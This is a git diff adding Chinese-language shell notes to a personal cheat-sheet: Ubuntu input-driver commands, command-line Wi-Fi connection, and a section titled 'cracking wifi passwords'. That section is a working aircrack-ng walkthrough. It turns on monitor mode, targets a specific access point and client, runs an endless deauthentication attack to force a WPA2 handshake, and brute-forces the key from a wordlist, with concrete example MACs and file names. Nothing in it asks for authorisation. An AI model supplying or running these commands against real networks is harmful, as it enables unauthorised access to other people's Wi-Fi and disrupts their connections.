@@ -5,6 +5,58 @@
 git ls-files | xargs cat | wc -l
 ```
 
+#### 卸载ubuntu系统得io驱动
+```shell
+sudo apt install xserver-xorg-input-all # 安装
+
+sudo apt autoremove xserver-xorg-input-all # 卸载
+```
+
+#### 使用命令连接网络
+```shell
+sudo systemctl start NetworkManager # 开启网络服务
+
+ip addr 或者 ifconfig # 查看无线网卡名称(w开头得)
+
+iwlist 无线网卡 scanning | grep -i essid # 扫描可用wifi
+
+nmcli device wifi connect wifi名字 password wifi密码 ifname 无线网卡 # 用这个无线网卡链接指定wifi
+```
+
+#### 破解wifi密码
+```shell
+sudo apt install aircrack-ng # 安装aircrack-ng 这个工具kali-linux默认安装了
+
+airmon-ng # 查看可用的无线网卡
+
+airmon-ng start <网卡名称> # 指定无线网卡开启监听模式
+# airmon-ng start wlp8s0
+
+airodump-ng <处于监听模式的网卡名称> # 用这个监听网卡扫描附近的无线网络
+# airodump-ng wlp8s0mon
+# BSSID: 无线 AP 的硬件地址
+# PWR: 信号强度，值是负数，绝对值越小表示信号越强
+# CH: 无线网络信道
+# ENC: 加密方式，我们要破解的是 WPA2
+# ESSID: 无线网络的名称
+
+
+airodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称> # 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用
+# airodump-ng -w android -c 6 --bssid 22:47:DA:62:2A:F0 wlp8s0mon
+# BSSID: 无线 AP 的硬件地址
+# STATION: 用户设备的硬件地址
+
+aireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对目标设备发起ack攻击
+# aireplay-ng -0 0 -a 22:47:DA:62:2A:F0 -c AC:BC:32:96:31:8D wlp8s0mon
+
+aircrack-ng -w 密码字典 <包含握手包的 cap 文件> # 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND!
+# aircrack-ng -w wpa-dictionary/common.txt android-01.cap 
+
+airmon-ng stop <处于监听模式的无限网卡名称> # 无线网卡退出监听模式
+# airmon-ng stop wlp8s0mon
+```
+
+
 #### Mysql
 ##### 导出数据库
 ```sql
